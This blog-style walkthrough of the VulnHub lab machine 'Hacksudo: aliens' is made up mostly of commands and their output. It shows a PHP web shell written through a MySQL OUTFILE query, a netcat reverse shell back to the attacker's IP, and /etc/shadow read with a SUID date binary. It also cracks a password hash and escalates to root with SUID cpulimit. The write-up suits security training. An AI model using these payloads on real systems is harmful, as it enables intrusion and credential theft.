---
layout: post
title:  "VulnHub - Hacksudo : aliens"
date:   2021-04-11 23:23:04 +0300
categories: [vulnhub,walkthrough]
pin: true
tags: [backup,mysql,SUID,crack,cpulimit,date,phpmyadmin]
image: /images/alien.jpg
---
You’ll find this vm here :  `https://www.vulnhub.com/entry/hacksudo-aliens,676/`

## Hacksudo - Aliens

#### Port Scan

{% highlight sh %}
  ┌──(alienum㉿kali)-[~]
  └─$ nmap 10.0.2.224  
  Nmap scan report for 10.0.2.224 (10.0.2.224)
  Host is up (0.0066s latency).
  Not shown: 997 closed ports
  PORT     STATE SERVICE
  22/tcp   open  ssh
  80/tcp   open  http
  9000/tcp open  cslistener
{% endhighlight %}

#### Directory Scan
- Focus to `/backup`
{% highlight sh %}
  ┌──(alienum㉿kali)-[~]
  └─$ gobuster dir -k -u http://10.0.2.224 -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt  -x .txt,.bak,.html
  ===============================================================
  Gobuster v3.1.0
  by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
  ===============================================================
  [+] Url:                     http://10.0.2.224
  [+] Method:                  GET
  [+] Threads:                 10
  [+] Wordlist:                /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt
  [+] Negative Status codes:   404
  [+] User Agent:              gobuster/3.1.0
  [+] Extensions:              txt,bak,html
  [+] Timeout:                 10s
  ===============================================================
  2021/04/09 16:08:56 Starting gobuster in directory enumeration mode
  ===============================================================
  /images               (Status: 301) [Size: 309] [--> http://10.0.2.224/images/]
  /index.html           (Status: 200) [Size: 2225]                               
  /game.html            (Status: 200) [Size: 701]                                
  /backup   	      (Status: 301) [Size: 309] [--> http://10.0.2.224/backup/]
{% endhighlight %}

![image]( /assets/img/hacksudo/hacksudo-1.png)

#### Download the mysql.bak

{% highlight sh %}
  ┌──(alienum㉿kali)-[~]
  └─$ wget 10.0.2.224/backup/mysql.bak                                                                             1 ⚙
  --2021-04-09 16:11:07--  http://10.0.2.224/backup/mysql.bak
  Connecting to 10.0.2.224:80... connected.
  HTTP request sent, awaiting response... 200 OK
  Length: 1226 (1.2K) [application/x-trash]
  Saving to: ‘mysql.bak’

  mysql.bak                     100%[==============================================>]   1.20K  --.-KB/s    in 0s      

  2021-04-09 16:11:07 (138 MB/s) - ‘mysql.bak’ saved [1226/1226]
{% endhighlight %}

- Find credentials

{% highlight sh %}                                                                                                       
  ┌──(alienum㉿kali)-[~]
  └─$ cat mysql.bak                                                                                                1 ⚙
  #!/bin/bash

  # Specify which database is to be backed up
  db_name=""

  # Set the website which this database relates to
  website="localhost"

  # Database credentials
  user="vishal"
  password="hacksudo"
  host="localhost"
  ...
{% endhighlight %}

#### PHPmyAdmin

- Go to port `9000` and login using `vishal:hacksudo`

#### Upload the backdoor using `MySQL` query
{% highlight sql %}
  SELECT "<?php system($_GET['cmd']); ?>" into outfile "/var/www/html/backdoor.php"
{% endhighlight %}

![image]( /assets/img/hacksudo/hacksudo-2.png)

#### Reverse console

- `Curl`
{% highlight sh %}
  ┌──(alienum㉿kali)-[~]
  └─$ curl http://10.0.2.224/backdoor.php?cmd=nc%20-e%20%2Fbin%2Fsh%2010.0.2.15%205555  
{% endhighlight %}

- `Listener`
{% highlight sh %}
  ┌──(alienum㉿kali)-[~]
  └─$ nc -lvp 5555
  listening on [any] 5555 ...
  connect to [10.0.2.15] from 10.0.2.224 [10.0.2.224] 33034
  id
  uid=33(www-data) gid=33(www-data) groups=33(www-data)
  /usr/bin/script -qc /bin/bash /dev/null
  www-data@hacksudo:/var/www/html$
{% endhighlight %}

![image]( /assets/img/hacksudo/hacksudo-3.png)


#### SUID Permissions
{% highlight sh %}
  www-data@hacksudo:~$ find / -perm -u=s -type f 2>/dev/null
  find / -perm -u=s -type f 2>/dev/null
  /usr/bin/date #<----- Our target
  /usr/bin/pkexec
  /usr/bin/passwd
  /usr/bin/chfn
  ...
  /usr/bin/chsh
  /usr/bin/umount
  /usr/bin/newgrp
{% endhighlight %}

#### GTFOBins - SUID - date

- read `/etc/shadow`

{% highlight sh %}
  www-data@hacksudo:/tmp$ LFILE=/etc/shadow
  LFILE=/etc/shadow
  www-data@hacksudo:/tmp$ date -f $LFILE
  date -f $LFILE
  date: invalid date 'root:$6$N6p.dpWhPYXSXC9U$8EraUiQ5DtMF5ov2ZbnY8DoLK1liRukqhTnTTK67MQ.tgpglkVX/I9P1aYjNeO/cwjQk9lJ/ABd9YLTMeMSn3/:18721:0:99999:7:::'
  date: invalid date 'www-data:*:18714:0:99999:7:::'
  ...
  date: invalid date 'hacksudo:$6$cOv4E/VKAe0EVwV4$YScCx10zfi7g4aiLY.qo8QPm2iOogJea41mk2rGk/0JM5AtnrmiyTN5ctNJ0KTLS5Iru4lHWYPug792u3L/Um1:18721:0:99999:7:::'
  www-data@hacksudo:/tmp$
{% endhighlight %}

#### Crack the hash | John
- crack `hacksudo` password hash
{% highlight sh %}
  ┌──(alienum㉿kali)-[~/Desktop]
  └─$ cat hash   
  hacksudo:$6$cOv4E/VKAe0EVwV4$YScCx10zfi7g4aiLY.qo8QPm2iOogJea41mk2rGk/0JM5AtnrmiyTN5ctNJ0KTLS5Iru4lHWYPug792u3L/Um1

  ┌──(alienum㉿kali)-[~/Desktop]
  └─$ john hash --wordlist=/usr/share/wordlists/rockyou.txt
  Using default input encoding: UTF-8
  Loaded 1 password hash (sha512crypt, crypt(3) $6$ [SHA512 256/256 AVX2 4x])
  Cost 1 (iteration count) is 5000 for all loaded hashes
  Press 'q' or Ctrl-C to abort, almost any other key for status
  aliens           (hacksudo)
  1g 0:00:00:06 DONE (2021-04-09 16:23) 0.1490g/s 1144p/s 1144c/s 1144C/s emilee..thesimpsons
  Use the "--show" option to display all of the cracked passwords reliably
  Session completed
{% endhighlight %}

#### SSH Credentials
- `hacksudo`:`aliens`

#### User
{% highlight sh %}
  hacksudo@hacksudo:~/Desktop$ cat user.txt
  9fb4c0afce26929041427c935c6e0879
{% endhighlight %}

#### SUID Permissions
- This time ur target is `/home/hacksudo/Downloads/cpulimit`
{% highlight sh %}
  hacksudo@hacksudo:~/Desktop$ find / -perm -u=s -type f 2>/dev/null
  /home/hacksudo/Downloads/cpulimit
  /usr/bin/date
  /usr/bin/pkexec
  /usr/bin/passwd
  ...
{% endhighlight %}


#### GTFOBins | CPULimit to Root
{% highlight sh %}
  hacksudo@hacksudo:~/Desktop$ /home/hacksudo/Downloads/cpulimit -l 100 -f -- /bin/sh -p
  Process 1479 detected
  # id
  uid=1000(hacksudo) gid=1000(hacksudo) euid=0(root) egid=0(root) groups=0(root),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),109(netdev),112(bluetooth),116(lpadmin),117(scanner),1000(hacksudo)
  # cd /root
  # cat root.txt
   _   _            _                  _       
  | | | | __ _  ___| | _____ _   _  __| | ___  
  | |_| |/ _` |/ __| |/ / __| | | |/ _` |/ _ \
  |  _  | (_| | (__|   <\__ \ |_| | (_| | (_) |
  |_| |_|\__,_|\___|_|\_\___/\__,_|\__,_|\___/

      _    _ _            ____   __   
     / \  | (_) ___ _ __ | ___| / /_  
    / _ \ | | |/ _ \ '_ \|___ \| '_ \
   / ___ \| | |  __/ | | |___) | (_) |
  /_/   \_\_|_|\___|_| |_|____/ \___/

  congratulations you rooted hacksudo alien56...!!!
  flag={d045e6f9feb79e94442213f9d008ac48}
  #
{% endhighlight %}
